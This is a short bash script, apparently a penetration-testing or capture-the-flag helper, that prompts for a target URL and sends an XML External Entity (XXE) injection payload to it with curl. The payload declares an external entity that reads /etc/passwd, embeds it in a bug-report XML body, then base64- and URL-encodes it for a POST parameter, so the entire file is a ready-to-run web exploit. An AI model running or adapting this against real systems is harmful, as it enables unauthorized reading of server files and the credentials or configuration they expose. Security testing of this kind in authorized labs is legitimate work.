#!/bin/bash

#ONLY for payload encoded in base64 +URLencoded 
#check dependencies: if "urlencode: command not found" do sudo apt-get install gridsite-clients

echo 'Test for (XML External Entity)XXE injection'
read -p 'Insert here the url you want to test for XXE: ' URL

payload=$(urlencode $(echo "<?xml  version='1.0' encoding='ISO-8859-1'?>
	<!DOCTYPE foo [
	<!ELEMENT foo ANY >
	<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>
        	<bugreport>
                <title>&xxe;</title>
                <cwe>test</cwe>
                <cvss>testtest</cvss>
                <reward>testtesttest</reward>
                </bugreport>" | base64 | tr -d '\n' ))

curl $URL -s -X POST -d data="$payload"

